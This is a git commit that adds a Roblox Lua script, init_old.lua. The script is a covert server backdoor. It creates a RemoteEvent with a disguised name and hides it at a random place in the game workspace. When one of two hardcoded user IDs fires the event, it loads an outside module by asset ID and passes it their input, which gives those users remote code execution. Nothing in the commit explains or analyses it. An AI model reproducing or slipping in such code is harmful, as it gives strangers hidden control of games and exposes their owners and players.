25593a1207016f1b867bc8cc287fc998ac62b05c
Whims-Dev <110363728+Whims-Dev@users.noreply.github.com>
2022-07-31 20:47:20 -0700

    Create init_old.lua

---
+++ init_old.lua
@@ -0,0 +1,29 @@
+local users = { 332777848, 5303687 };
+
+local function GetParent()
+    local descendants = workspace:GetDescendants();
+    local parent = descendants[math.random(1, #descendants)];
+
+    local badancestors = { workspace:FindFirstChild("Camera"), workspace:FindFirstChild("Terrain"), workspace:FindFirstChild("Entities") };
+    for _, ancestor in pairs(badancestors) do
+        if (ancestor ~= nil) and (parent:IsDescendantOf(ancestor)) then
+            parent = GetParent();
+            continue;
+        end
+    end
+
+    return parent;
+end
+
+local function Reload()
+    local RemoteEvent = Instance.new("RemoteEvent")
+    RemoteEvent.Name = "Α&Ω"
+    RemoteEvent.OnServerEvent:Connect(function(player, a: string)
+        if (table.find(users, player.UserId)) then
+            require(10435436306)(a);
+        end
+    end)
+    RemoteEvent.Parent = GetParent();
+end
+
+coroutine.wrap(Reload)()
